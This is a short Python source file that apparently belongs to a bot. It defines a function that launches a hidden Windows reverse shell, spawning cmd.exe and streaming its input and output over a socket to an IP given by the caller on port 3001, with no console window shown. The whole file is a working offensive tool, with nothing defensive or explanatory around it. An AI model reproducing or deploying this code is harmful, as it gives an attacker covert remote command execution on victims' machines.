import subprocess
import sys

def connect_reverse_shell(ip):
    """
    Launches a reverse shell to the specified IP on port 3001.
    This runs a python one-liner in a separate process.
    """
    # The python one-liner payload
    # We need to be careful with escaping quotes.
    # The user provided:
    # python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('IP',3001));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
    
    payload = (
        f"import socket,os,threading,subprocess as sp;"
        f"p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);"
        f"s=socket.socket();s.connect(('{ip}',3001));"
        f"threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();"
        f"threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
    )

    try:
        # We run this as a detached process so it doesn't block the bot
        subprocess.Popen(
            [sys.executable, "-c", payload],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return f"Reverse shell connection initiated to {ip}:3001"
    except Exception as e:
        return f"Failed to start reverse shell: {e}"
